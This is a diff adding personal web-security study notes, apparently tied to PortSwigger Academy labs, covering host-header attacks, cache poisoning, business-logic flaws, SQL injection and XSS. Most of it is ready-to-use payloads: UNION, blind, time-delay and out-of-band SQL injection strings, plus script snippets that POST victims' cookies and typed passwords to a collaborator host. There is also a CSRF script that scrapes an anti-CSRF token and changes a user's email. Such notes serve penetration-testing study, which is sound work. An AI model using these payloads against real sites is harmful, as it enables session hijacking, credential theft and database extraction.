@@ -1,3 +1,175 @@
+## Host header
+
+ - X-Forwarded-Host, X-Host, X-HTTP-Host-Override, Forwarded headers
+ - Double host headers
+ - Absolute URL
+ - Line wrapping (space/tab)
+ - localhost as host headers
+ - GET http://domain.com/ HTTP/1.1
+
+ * Routing-based SSRF
+  -> Collaborator on host, look for DNS req from CDN
+
+ * Password reset poisoning
+
+## Business logic
+
+ - 2FA
+ - exceptional input (negative nb, long string, ...)
+ - check email changement needs verification
+ - remove parameter (or make it empty)
+ - not following the intended sequence
+
+## Web cache poisoning
+
+  * identify and evaluate unkeyed inputs
+   -> param miner
+   -> Vary header
+  * elicit a harmful response from the back-end server
+  * get the response cached
+
+## SQLI
+
+    ### SQLI UNION attacks
+
+  * SELECT a, b FROM table1 UNION SELECT c, d FROM table2 
+  * individual queries must return the same number of columns
+  * data types in each column must be compatible between the individual queries
+
+  -> 2 methods to determine the number of columns required
+  * ' ORDER BY 1--, ' ORDER BY 2--, ... until error occurs
+  * ' UNION SELECT NULL--, ' UNION SELECT NULL,NULL--, ... until error
+
+  * Notes:
+  !! On Oracle, every SELECT query must use the FROM keyword and specify a
+  valid table. There is a built-in table on Oracle called DUAL which can be
+  used for this purpose. So the injected queries on Oracle would need to look
+  like: ' UNION SELECT NULL FROM DUAL--
+
+  !! The payloads described use the double-dash comment sequence -- to comment
+  out the remainder of the original query following the injection point. On
+  MySQL, the double-dash sequence must be followed by a space. Alternatively,
+  the hash character # can be used to identify a comment
+
+  SQLI cheat sheet : portswigger.net/web-security/sql-injection/cheat-sheet
+
+  -> finding columns with a useful data type:
+  * ' UNION SELECT 'a',NULL,NULL,NULL--
+  * ' UNION SELECT NULL,'a',NULL,NULL--
+  * ...
+
+  -> retrieving multiple values within a single column:
+  * ' UNION SELECT username || '~' || password FROM users-- 
+
+    ### Examining the database
+
+  * Querying the database type and version
+  * Listing the contents of the database
+
+    !! It is different for Oracle DB, see SQLI cheatsheet
+
+    You can query information_schema.tables to list the tables in the database:
+
+    SELECT * FROM information_schema.tables
+
+    This returns output like the following:
+
+    TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
+    =====================================================
+    MyDatabase dbo Products BASE TABLE
+    MyDatabase dbo Users BASE TABLE
+    MyDatabase dbo Feedback BASE TABLE
+
+    then
+
+    SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+    This returns output like the following:
+
+    TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
+    =================================================================
+    MyDatabase dbo Users UserId int
+    MyDatabase dbo Users Username varchar
+    MyDatabase dbo Users Password varchar
+
+  -> see SQLI cheatsheet for payload
+
+    ### Blind SQL injection vulnerabilities
+
+  - Exploiting blind SQLI by triggering conditional responses
+  * xyz' UNION SELECT 'a' WHERE 1=1--
+  * xyz' UNION SELECT 'a' WHERE 1=2-- 
+
+  * xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and
+    SUBSTRING(Password, 1, 1) = 's'-- 
+
+  - Inducing conditional responses by triggering SQL errors
+  * xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
+  * xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- 
+
+  !! Note: The SUBSTRING function is called SUBSTR on some types of database
+
+    ### Exploiting blind SQL injection by triggering time delays
+
+  * '; IF (1=2) WAITFOR DELAY '0:0:10'--
+  * '; IF (1=1) WAITFOR DELAY '0:0:10'-- 
+
+  example:
+  '; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 11,
+  1) = 'c') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--
+
+
+    ### Exploiting blind SQLI using out-of-band (OAST) techniques
+
+  '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+## XSS
+
+  ### Steal cookie
+
+    <script>
+    fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
+    method: 'POST',
+    mode: 'no-cors',
+    body:document.cookie
+    });
+    </script>
+
+  ### Steal password
+
+    <input name=username id=username>
+    <input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+    method:'POST',
+    mode: 'no-cors',
+    body:username.value+':'+this.value
+    });">
+
+  ### CSRF email change (with anti-CSRF token)
+
+    <script>
+    var req = new XMLHttpRequest();
+    req.onload = handleResponse;
+    req.open('get','/email',true);
+    req.send();
+    function handleResponse() {
+        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+        var changeReq = new XMLHttpRequest();
+        changeReq.open('post', '/email/change-email', true);
+        changeReq.send('csrf='+token+'&email=test@test.com')
+    };
+    </script>
+
+  ### Reflected XSS into HTML context with most tags and attributes blocked
+
+  Use Burp Intruder to test which tags and attributes are being blocked:
+
+  * Use "copy tags to clipboard" from xss cheatsheet to bruteforce tags
+  * Use "copy events to clipboard" from xss cheatsheet, and change the payload
+    for instance: <body%20$$=1>
+  * Then setup the attack with found tag and event
+    for instance:
+    <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
+
 ## Node dependencies
 
 npm audit -> list of advisories for outdated dependencies
